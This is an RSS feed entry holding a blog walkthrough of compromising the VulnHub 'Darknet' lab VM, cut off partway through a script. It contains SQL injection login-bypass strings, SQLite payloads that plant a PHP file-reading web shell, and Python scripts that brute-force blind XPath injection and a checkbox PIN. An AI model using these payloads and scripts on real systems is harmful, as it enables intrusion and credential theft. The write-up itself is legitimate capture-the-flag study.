<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Vulnhub on #!/slash/note</title>
    <link>https://leonjza.github.io/categories/vulnhub/</link>
    <description>Recent content in Vulnhub on #!/slash/note</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 16 Jun 2016 21:54:55 +0200</lastBuildDate>
    <atom:link href="https://leonjza.github.io/categories/vulnhub/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>rooting darknet</title>
      <link>https://leonjza.github.io/blog/2016/06/16/rooting-darknet/</link>
      <pubDate>Thu, 16 Jun 2016 21:54:55 +0200</pubDate>
      
      <guid>https://leonjza.github.io/blog/2016/06/16/rooting-darknet/</guid>
      <description>

&lt;p&gt;Its been a while since I have done a vulnerable boot2root from &lt;a href=&#34;https://twitter.com/vulnhub&#34;&gt;@VulnHub&lt;/a&gt;. So, I decided to pick up where I last left. After paging back from the latest VM&amp;rsquo;s to where I roughly stopped last year, my attention was drawn to &lt;a href=&#34;https://www.vulnhub.com/entry/darknet-10,120/&#34;&gt;Darknet&lt;/a&gt; by &lt;a href=&#34;https://twitter.com/Q3rv0&#34;&gt;@Q3rv0&lt;/a&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This is how I managed to solve a VM that totally kicked my ass! While I was solving this VM, I also tried out a Kali Docker image! This actually worked out great.&lt;/p&gt;

&lt;h2 id=&#34;getting-started&#34;&gt;getting started&lt;/h2&gt;

&lt;p&gt;Starting with these VM&amp;rsquo;s is almost always the same story and Darknet was no different. Pick up the VM&amp;rsquo;s IP address (yes, I still use the VMWare network sniffer &lt;code&gt;sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-sniffer -e vmnet8&lt;/code&gt;). &lt;strong&gt;192.168.252.140&lt;/strong&gt;. On to the &lt;code&gt;nmap&lt;/code&gt;!&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -v --reason 192.168.252.140 -sV

Starting Nmap 7.12 ( https://nmap.org ) at 2016-06-16 20:13 UTC

[...]

Reason: 998 resets
PORT    STATE SERVICE REASON         VERSION
80/tcp  open  http    syn-ack ttl 37 Apache httpd 2.2.22 ((Debian))
111/tcp open  rpcbind syn-ack ttl 37 2-4 (RPC #100000)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Just &lt;code&gt;tcp/80&lt;/code&gt; to work with really. &lt;code&gt;tcp/111&lt;/code&gt; did not yield anything interesting at first glance, but the most obvious next step was definitely the web port.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_homepage.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;888-darknet-com&#34;&gt;888.darknet.com&lt;/h2&gt;

&lt;p&gt;The homepage on the web server I have found so far was not very interesting. I scanned it with &lt;code&gt;gobuster&lt;/code&gt; hoping to discover some more directories which revealed the existence of an &lt;code&gt;/access&lt;/code&gt; folder.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# gobuster -u http://192.168.252.140/ -w /usr/share/wordlists/wfuzz/general/common.txt

Gobuster v1.1                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.252.140/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/wfuzz/general/common.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/access (Status: 301)
/index (Status: 200)
=====================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Browsing to &lt;a href=&#34;http://192.168.252.140/access/&#34;&gt;http://192.168.252.140/access/&lt;/a&gt; showed that directory indexing was enabled and revealed the &lt;code&gt;888.darknet.com.backup&lt;/code&gt; file.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_access_folder.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Downloading and inspecting the file, it quickly became apparent that this looked like an &lt;a href=&#34;https://httpd.apache.org/docs/current/vhosts/examples.html&#34;&gt;Apache Virtual Host&lt;/a&gt; configuration.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# cat 888.darknet.com.backup
&amp;lt;VirtualHost *:80&amp;gt;
    ServerName 888.darknet.com
    ServerAdmin devnull@darknet.com
    DocumentRoot /home/devnull/public_html
    ErrorLog /home/devnull/logs
&amp;lt;/VirtualHost&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I took this as a hint that I would have to hack an entry into my local &lt;code&gt;/etc/hosts&lt;/code&gt; to resolve &lt;em&gt;888.darknet.com&lt;/em&gt; to &lt;em&gt;192.168.252.140&lt;/em&gt;. After having done that, we are presented with yet another page with a login.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_888_login.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;888-authentication-bypass&#34;&gt;888 authentication bypass&lt;/h2&gt;

&lt;p&gt;Natural instinct has it that when you see login pages like these, you just throw some single quotes at the fields to see what happens. I did exactly this and was pleasantly met with an error response along the lines of &lt;code&gt;unrecognized token: &amp;quot;3590cb8af0bbb9e78c343b52b93773c9&amp;quot;&lt;/code&gt;. This just &lt;strong&gt;screamed&lt;/strong&gt; SQL injection! I figured since it seems to be reflecting errors back at the page, &lt;code&gt;sqlmap&lt;/code&gt; might just quickly sort out this stage for us without much effort. &lt;strong&gt;Nope!&lt;/strong&gt; After quite a bit of time, I learnt that the SQL injection only appears to be in the &lt;code&gt;username&lt;/code&gt; field, but no matter how I tried to get &lt;code&gt;sqlmap&lt;/code&gt; to play along, I was inevitably met with &lt;code&gt;[WARNING] POST parameter &#39;username&#39; is not injectable&lt;/code&gt; every time.&lt;/p&gt;

&lt;p&gt;Admitting defeat, I figured I should stop being lazy and attempt the injection manually. The fact that the error message returned &lt;code&gt;unrecognized token&lt;/code&gt; hinted towards the idea that the backend database might be SQLite. This gives me a frame of reference for the SQL dialect to use. Next, the most critical step for the injection to be successful was to try and envision what the query must look like in the backend. I played around quite a bit more, and got he most information out of the error message when I have the value &lt;code&gt;&#39;&amp;quot;1&lt;/code&gt; as a username and any text as a password.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_888_login_error.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Great. So with &lt;code&gt;&amp;quot;&amp;quot;1&#39; and pass=&#39;03c7c0ace395d80182db07ae2c30f034&#39;&amp;quot;&lt;/code&gt; as the error message, I theorized that the SQL query might be something along the lines of:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;SELECT * FROM users WHERE user=&#39;&amp;lt;INJECT&amp;gt;&#39; and pass=&#39;&amp;lt;MD5 OF PASS&amp;gt;&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the softwares logic then, there may be a requirement to just have a row return to mark the session as logged in. Makes sense right? :) So, in order to attempt an authentication bypass, I will need to try and get the query manipulated in such a way that the query will return a valid row regardless of the password. In SQL, we can have something like &lt;code&gt;SELECT 1&lt;/code&gt; which will just return &lt;code&gt;1&lt;/code&gt; in the row set.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# sqlite3
SQLite version 3.8.10.2 2015-05-20 18:17:19
Enter &amp;quot;.help&amp;quot; for usage hints.
Connected to a transient in-memory database.
Use &amp;quot;.open FILENAME&amp;quot; to reopen on a persistent database.
sqlite&amp;gt; SELECT 1;
1
sqlite&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With this knowledge, we can imagine that we could have the final query the software will execute look something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;SELECT * FROM users WHERE user=&#39;a user&#39; or &#39;1&#39; and pass=&#39;&amp;lt;MD5 OF PASS&amp;gt;&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In other words, if the injection point is in the &lt;code&gt;user&lt;/code&gt; section, the payload we need to execute may be derived as follows:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;SELECT * FROM users WHERE user=&#39;&lt;/code&gt; &lt;strong&gt;a user&amp;rsquo; or &amp;lsquo;1&lt;/strong&gt; &lt;code&gt;&#39; and pass=&#39;&amp;lt;MD5 OF PASS&amp;gt;&#39;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This obviously begs the requirement to have knowledge of a valid user! Well, remember that Apache Virtual host config file? It mentioned that the server admin is &lt;code&gt;devnull@darknet.com&lt;/code&gt;. Admittedly, this took me a while to get to (and maybe a bit of a cheat :P), but using a username of &lt;code&gt;devnull&lt;/code&gt; will complete the requirements we have to bypass the authentication needed for this page.&lt;/p&gt;

&lt;p&gt;Considering the injection point and theorized query, we can use a username of &lt;code&gt;devnull&#39; or 1&#39;&lt;/code&gt; and any password to login.&lt;/p&gt;

&lt;h2 id=&#34;administrator-sql-shell&#34;&gt;administrator sql shell&lt;/h2&gt;

&lt;p&gt;After the login bypass, I was presented with a page titled &lt;strong&gt;Administrador SQL&lt;/strong&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_888_administrator_sql.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I tried a few queries but quickly realized that no output was returned no matter what you gave it.&lt;/p&gt;

&lt;p&gt;While researching some of the possibilities with SQLite injection, I came across &lt;a href=&#34;http://gwae.trollab.org/sqlite-injection.html&#34;&gt;this&lt;/a&gt; blogpost that details a method of writing arbitrary code to a file of our choosing (obviously assuming we have write access there). Considering I had a fictitious &lt;em&gt;SQL shell&lt;/em&gt; now, I jumped right into trying this.&lt;/p&gt;

&lt;p&gt;The first thing I needed to do though was to find a writable directory. The blogpost mentions that &lt;code&gt;uploads/&lt;/code&gt; and &lt;code&gt;cache/&lt;/code&gt; are usually good candidates (and rightfully so), but it did not seem like the paths existed at &lt;a href=&#34;http://888.darknet.com/uploads/&#34;&gt;http://888.darknet.com/uploads/&lt;/a&gt; and &lt;a href=&#34;http://888.darknet.com/cache/&#34;&gt;http://888.darknet.com/cache/&lt;/a&gt;. So I pulled up &lt;code&gt;gobuster&lt;/code&gt; again to see if there are any other directories I could potentially use for this.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# gobuster -u http://888.darknet.com/ -w /usr/share/wordlists/wfuzz/general/common.txt

Gobuster v1.1                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://888.darknet.com/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/wfuzz/general/common.txt
[+] Status codes : 302,307,200,204,301
=====================================================
/css (Status: 301)
/img (Status: 301)
/includes (Status: 301)
=====================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3 hits for &lt;code&gt;/css&lt;/code&gt;, &lt;code&gt;/img&lt;/code&gt; and &lt;code&gt;/includes&lt;/code&gt;. Considering I had the VirtualHost configuration file, I also knew that these paths are most probably relative to the DocumentRoot at &lt;code&gt;/home/devnull/public_html&lt;/code&gt;. Now, all I had to do was modify the payload as explained in the blogpost and cross my fingers. Without boring you with the nitty gritty details, I finally managed to figure out that I can write to the &lt;code&gt;/img&lt;/code&gt; directory and gain some code execution.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ATTACH DATABASE &#39;/home/devnull/public_html/img/phpinfo.php&#39; as pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES (&#39;&amp;lt;?php phpinfo(); ?&amp;gt;&#39;);
&lt;/code&gt;&lt;/pre&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_888_phpinfo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Yeah&amp;hellip; look at that. The amount of &lt;code&gt;disable_functions&lt;/code&gt; values explain why my initial &lt;code&gt;system()&lt;/code&gt; type PHP shells were failing. Nonetheless, I was still able to browse the filesystem with a very rudementary script injected using the SQL shell I still had. The payload was as follows that allowed me to browse around and cat things.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ATTACH DATABASE &#39;/home/devnull/public_html/img/files.php&#39; as pwn;
CREATE TABLE pwn.shell (code TEXT);
INSERT INTO pwn.shell (code) VALUES (&amp;quot;&amp;lt;?php if($_GET[&#39;a&#39;] == &#39;ls&#39;) { print_r(scandir($_GET[&#39;p&#39;])); } if($_GET[&#39;a&#39;] == &#39;cat&#39;) { print_r(readfile($_GET[&#39;p&#39;])); } ?&amp;gt;&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looking at the &lt;code&gt;phpinfo()&lt;/code&gt; output, I also noticed the &lt;code&gt;open_basedir&lt;/code&gt; value was set to &lt;code&gt;/etc/apache2:/home/devnull:/tmp&lt;/code&gt;. This is kinda what motivated me to slap together that quick file browsing script so that I can see whats so interesting in &lt;code&gt;/etc/apache2&lt;/code&gt; (especially since we already had this one vhost config requirement to get to this stage).&lt;/p&gt;

&lt;p&gt;Lastly, I also learnt that we are currently the &lt;code&gt;devnull&lt;/code&gt; user on a Debian Linux box&amp;hellip; Weird. I expected something like &lt;code&gt;www-data&lt;/code&gt; but ok.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_888_id.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Getting back to the &lt;code&gt;/etc/apache2&lt;/code&gt; thing, I found another VirtualHost configuration file there in &lt;code&gt;/etc/apache2/sites-available/&lt;/code&gt;. This was done using the &lt;code&gt;files.php&lt;/code&gt; script I wrote and toggling the &lt;code&gt;a&lt;/code&gt; parameter to &lt;code&gt;ls&lt;/code&gt; or &lt;code&gt;cat&lt;/code&gt; as needed. I was not able to find anything else interesting thanks to that epic &lt;code&gt;open_basedir&lt;/code&gt; setting :/&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_888_signal8.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;signal8-so-much-hate&#34;&gt;signal8. so much hate.&lt;/h2&gt;

&lt;p&gt;I added another entry to my &lt;code&gt;/etc/hosts&lt;/code&gt; and browsed to the new hostname discovered in that configuration file.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_home.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Poking around with the new website had a few points of interest but nothing that had any obvious bugs. The URL &lt;a href=&#34;http://signal8.darknet.com/contact.php?id=1&#34;&gt;http://signal8.darknet.com/contact.php?id=1&lt;/a&gt; had something funny going on with the &lt;code&gt;id&lt;/code&gt; field though I could not confirm if this was another SQL injection bug or not. A &lt;code&gt;robots.txt&lt;/code&gt; also existed for this site and had the entry &lt;code&gt;Disallow: /xpanel/&lt;/code&gt;. Browsing to this I was met with a login page.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The login page too did not seem to have any obvious bugs. Some quick scans with &lt;code&gt;nikto&lt;/code&gt;, &lt;code&gt;sqlmap&lt;/code&gt; etc did not show me anything I did not already know.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;fast forward many many hours&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Eventually, I resorted to fuzzing all of the fields in the new site that I have found. I literally tested all of them, but again let me not bore you with the failed attempts ;) I will however detail the path that lead to success.&lt;/p&gt;

&lt;p&gt;To fuzz all of the input fields, I fired up BurpSuite, captured the request to &lt;a href=&#34;http://signal8.darknet.com/contact.php?id=1&#34;&gt;http://signal8.darknet.com/contact.php?id=1&lt;/a&gt; and sent it to Intruder.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_fuzzing.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Intruder was configured to use a simple fuzzing wordlist sourced from &lt;code&gt;/usr/share/wordlists/wfuzz/Injections/All_attack.txt&lt;/code&gt; on Kali Linux from the &lt;code&gt;wordlists&lt;/code&gt; package. Once the attack finished running, I went to the results and sorted them by response size. It was possible to quickly see in this case that those that returned an email address in the body and those that didn&amp;rsquo;t based purely on the size. Using this list, I was able to filter out and realize that the payload of &lt;code&gt;count(/child::node())&lt;/code&gt; managed to return a valid result for the &lt;code&gt;id&lt;/code&gt; parameter.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpath_discovery.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The first time I saw this I had no idea how much time I would be spending on this particular bug. In fact, I have never come across this before so this was &lt;strong&gt;by far&lt;/strong&gt; the most educational portion of the challenge for me!&lt;/p&gt;

&lt;h2 id=&#34;xpath-injection&#34;&gt;xpath injection&lt;/h2&gt;

&lt;p&gt;Just googling the term &lt;em&gt;count(/child::node())&lt;/em&gt; quickly revealed that this was something that related to XPath. XPath allows you to query XML datasets much like SQL can query databases. Ok great. Next up was a trip to owasp.org and their article on &lt;a href=&#34;https://www.owasp.org/index.php/XPATH_Injection&#34;&gt;XPATH Injection&lt;/a&gt;. I spent quite a bit of time researching this type of vulnerability. I realized that the case I was dealing with here was blind XPath injection. Much like blind SQL injection, blind XPath injection can also be exploited by running &amp;lsquo;queries&amp;rsquo; that return true/false. The condition for true in this case was the fact that the email address appeared, and false was that it was missing from the response.&lt;/p&gt;

&lt;p&gt;By far, &lt;a href=&#34;http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blind%20Xpath%20injection.pdf&#34;&gt;this&lt;/a&gt; PDF was the most useful in getting me to understand the vulnerability in the most depth.&lt;/p&gt;

&lt;p&gt;Before I could exploit this bug though, I had to come up with a way to test the theories that I was reading about locally. To do this, I copied some XML that I found in one of the articles to start.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;
&amp;lt;Employees&amp;gt;
   &amp;lt;Employee ID=&amp;quot;1&amp;quot;&amp;gt;
      &amp;lt;FirstName&amp;gt;Arnold&amp;lt;/FirstName&amp;gt;
      &amp;lt;LastName&amp;gt;Baker&amp;lt;/LastName&amp;gt;
      &amp;lt;UserName&amp;gt;ABaker&amp;lt;/UserName&amp;gt;
      &amp;lt;Password&amp;gt;SoSecret&amp;lt;/Password&amp;gt;
      &amp;lt;Type&amp;gt;Admin&amp;lt;/Type&amp;gt;
   &amp;lt;/Employee&amp;gt;
   &amp;lt;Employee ID=&amp;quot;2&amp;quot;&amp;gt;
      &amp;lt;FirstName&amp;gt;Peter&amp;lt;/FirstName&amp;gt;
      &amp;lt;LastName&amp;gt;Pan&amp;lt;/LastName&amp;gt;
      &amp;lt;UserName&amp;gt;PPan&amp;lt;/UserName&amp;gt;
      &amp;lt;Password&amp;gt;NotTelling&amp;lt;/Password&amp;gt;
      &amp;lt;Type&amp;gt;User&amp;lt;/Type&amp;gt;
   &amp;lt;/Employee&amp;gt;
&amp;lt;/Employees&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then wrote a small PHP script that would allow me to test payloads as if it were injected into the XML on the site I have with the bug. This script looked as follows:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php

// Get the argument from the cli
$id = $argv[1];
$xpath = &#39;//Employee[@ID=&#39; . $id . &#39;]/UserName&#39;;

// Be a little verbose about what the query will look like
print &#39;Injection    : &#39; . $id . PHP_EOL;
print &#39;Xpath        : &#39; . $xpath . PHP_EOL;
$xml = simplexml_load_file(&#39;test.xml&#39;);
print PHP_EOL;

// Run the XPath
$result = $xml-&amp;gt;xpath($xpath);

// Return a result of the XPath was valid etc.
print &#39;Blind:&#39; . PHP_EOL;
@print_r((string)$result[0]);

print PHP_EOL . PHP_EOL;

// Show the raw result of the XPath not filtered
print &#39;Raw:&#39; . PHP_EOL;
print_r($result);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I studied some XPath functions available on &lt;a href=&#34;http://devdocs.io/xslt_xpath-xpath-functions/&#34;&gt;devdocs.io&lt;/a&gt;. This reference together with what I read online as well as my small test scenario helped me figure that I could make use of the &lt;a href=&#34;http://devdocs.io/xslt_xpath/xpath/functions/starts-with&#34;&gt;starts-with()&lt;/a&gt; XPath function to test for true/false scenarios. This proved to work in my little test environment.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~/data/VulnHub/Darknet# php readxml.php &amp;quot;1 and starts-with(name(*[1]),&#39;F&#39;)=1&amp;quot;
Injection    : 1 and starts-with(name(*[1]),&#39;F&#39;)=1
Xpath        : //Employee[@ID=1 and starts-with(name(*[1]),&#39;F&#39;)=1]/UserName

Blind:
ABaker

Raw:
Array
(
    [0] =&amp;gt; SimpleXMLElement Object
        (
            [0] =&amp;gt; ABaker
        )

)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To test this scenario on Darknet, I took a guess at the node name of the field that is being returned as &lt;code&gt;email&lt;/code&gt; considering its an email address that is being returned. It is possible to brute force these names as you will see later.
To start testing the feasibility of the blind boolean based injection, I entered the payload &lt;code&gt;1 and starts-with(email, &#39;e&#39;)&lt;/code&gt; into the URL.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpath_booltest.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Boom. The email address is returned! This meant that I could run over a large key space and brute force other parts of the underlying XML, hoping to learn more of its structure. For clarities sake, the &lt;code&gt;starts-with()&lt;/code&gt; function will later be expanded to be something like &lt;code&gt;1 and starts-with(email, &#39;errorlevel&#39;)&lt;/code&gt;. Using the payload &lt;code&gt;2 and starts-with(email, &#39;d&#39;)&lt;/code&gt; will also return the &lt;code&gt;devnull@darknet.com&lt;/code&gt; email address as that email starts with &lt;code&gt;d&lt;/code&gt; which makes the XPath query true.&lt;/p&gt;

&lt;p&gt;I was not going to test all of these characters by hand, nope. I had to figure out what this XML looks like, so I wrote some scripts to help with that. The first script attempts to brute force the names of the current node as well as the parent node. If we have these names we can call them in an XPath query by name. For eg, &lt;code&gt;//parent/current/attribute&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;import requests
import string
import sys

entry_point = &#39;http://signal8.darknet.com/contact.php&#39;

payloads = {
    # . == current node and .. == parent node
    &#39;CurrentNode&#39;: &#39;1 and starts-with(name(.),&amp;quot;{exfil}&amp;quot;)=1&#39;,
    &#39;ParentNode&#39;: &#39;1 and starts-with(name(..),&amp;quot;{exfil}&amp;quot;)=1&#39;,
}


def w(t):
    sys.stdout.write(t)
    sys.stdout.flush()


for payload_type, payload in payloads.iteritems():

    w(&amp;quot;\n{}: &amp;quot;.format(payload_type))

    stop = False
    exfil = &#39;&#39;
    while not stop:

        stop = True

        for char in string.printable:
            r = requests.get(
                entry_point, params={
                    &#39;id&#39;: payload.format(exfil=(exfil + char))
                })
            if &#39;darknet.com&#39; in r.text:
                exfil += char
                w(char)
                stop = False

print &amp;quot;\nDone&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The script in action, determining that the XML has the structure &lt;code&gt;//auth/user&lt;/code&gt;:
&lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/ckyep1yvit8jxfo5fqbfxzn3u.js&#34; id=&#34;asciicast-ckyep1yvit8jxfo5fqbfxzn3u&#34; async&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;I was now able to theorize that the XML may have the following structure when calling user information. &lt;code&gt;//auth/user[@id=1]/email&lt;/code&gt; where &lt;code&gt;1&lt;/code&gt; is the ID of the user in question. I knew about the &lt;code&gt;email&lt;/code&gt; field as it was &lt;em&gt;almost&lt;/em&gt; obvious. I also discovered the &lt;code&gt;username&lt;/code&gt; field by guessing. I tried to apply the same brute force logic as I did to the values, but for some reason I was not getting any luck with payloads where I was trying to address attributes by position, such as with &lt;code&gt;[*1]&lt;/code&gt; for the first. This did work in my local test environment but not on Darknet. I had everything I needed to get the credentials for login (I think?), but did not have the passwords.&lt;/p&gt;

&lt;p&gt;Eventually I wrote another script to take some words from a wordlist and brute the attribute names, hoping to discover some more attributes!&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;import requests
import string
import sys

entry_point = &#39;http://signal8.darknet.com/contact.php&#39;

payload = &#39;1 and starts-with(name(//auth/user[id=1]/{word}),&amp;quot;{word}&amp;quot;)=1&#39;
with open(&#39;/usr/share/wfuzz/wordlist/general/spanish.txt&#39;) as f:
    for word in f.readlines():
        word = word.strip()
        r = requests.get(entry_point, params={&#39;id&#39;: payload.format(word=word)})
        if &#39;darknet.com&#39; in r.text:
            print &#39;Found attribute: {word}&#39;.format(word=word)

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Having noticed a large part of the sites have been in Spanish, I eventually used a Spanish wordlist and found the field name &lt;code&gt;clave&lt;/code&gt; with it. Urgh, that was mildly frustrating. Anyways, this script in action:
&lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/4fsl2fzb45yhpxxmr6ycwjpfe.js&#34; id=&#34;asciicast-4fsl2fzb45yhpxxmr6ycwjpfe&#34; async&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;Finally. &lt;code&gt;username&lt;/code&gt; &amp;amp; &lt;code&gt;clave&lt;/code&gt;! As the final piece to this puzzle, I took the original script used to brute force the XML structure and modified the payloads to now brute the values for &lt;code&gt;username&lt;/code&gt; and &lt;code&gt;clave&lt;/code&gt;! The new payloads were:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&#39;username&#39;: &#39;1 and starts-with((//auth/user[id=1]/username),&amp;quot;{exfil}&amp;quot;)=1&#39;,
&#39;password&#39;: &#39;1 and starts-with((//auth/user[id=1]/clave),&amp;quot;{exfil}&amp;quot;)=1&#39;,
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The brute force script in action with the new payloads:
&lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/4obby2xqro3xo8gomfwh427mu.js&#34; id=&#34;asciicast-4obby2xqro3xo8gomfwh427mu&#34; async&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;So the username and password combination that lets you login at &lt;a href=&#34;http://signal8.darknet.com/xpanel/&#34;&gt;http://signal8.darknet.com/xpanel/&lt;/a&gt; is &lt;code&gt;errorlevel&lt;/code&gt; / &lt;code&gt;tc65Igkq6DF&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&#34;the-ploy&#34;&gt;the ploy&lt;/h1&gt;

&lt;p&gt;Once you have logged in, you presented with a page with a login to &lt;em&gt;Editor PHP&lt;/em&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_loggedin.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The link to &lt;code&gt;edit.php&lt;/code&gt; had little value as it simply appeared to be a &amp;lsquo;troll&amp;rsquo; page. I guess the humor here is the fact that code/os command execution has been relatively painful and this may have been a sign of hope.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_troll_edit.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;When I viewed the page sources for the page I got when I just logged it, I saw a hint to a &lt;code&gt;ploy.php&lt;/code&gt; page.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_ploy.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Browsing to &lt;code&gt;ploy.php&lt;/code&gt;, I was met with a file upload and a series of checkboxes to tick.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/darknet_signal8_xpanel_ploy_upload.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;It very quickly became obvious that you have to select the right combination of checkboxes in order to be allowed to upload anything. Each checkbox had a numeric value, so I copied this out into a script and proceeded to try all of the combinations possible. I knew a combination was correct if the Spanish term &lt;em&gt;Key incorrecta!&lt;/em&gt; was not in the response. With some manual fiddling, I also learnt that the key was 4 integers long. Attempting a combination with more or less than 4 keys meant that the HTTP response had &lt;em&gt;La longitud de la clave no es la correcta!&lt;/em&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;import requests
import itertools
import sys

VALUES = [37, 12, 59, 58, 72, 17, 22, 10, 99]
PIN = None

s = requests.Session()


def w(text):
    sys.stdout.write(&#39;\r&#39; + text)
    sys.stdout.flush()


# Need a valid session before we can continue.
print(&#39;[+] Logging in&#39;)
s.post(&#39;http://signal8.darknet.com/xpanel/index.php&#39;, data={
    &#39;username&#39;: &#39;errorlevel&#39;,
    &#39;password&#39;: &#39;tc65Igkq6DF&#39;,
})

print(&#39;[+] Bruting PIN Code ...&#39;)
for c in itertools.permutations(VALUES, 4):
    w(&amp;quot;{pin}&amp;quot;.format(pin=&#39;, &#39;.join(map(str, c))))
    r = s.post(&#39;http://signal8.darknet.com/xpanel/ploy.php&#39;,
               files={&#39;imag&#39;: open(&#39;test_image.png&#39;, &#39;rb&#39;)},
               data={
                   &#39;checkbox[]&#39;: c,
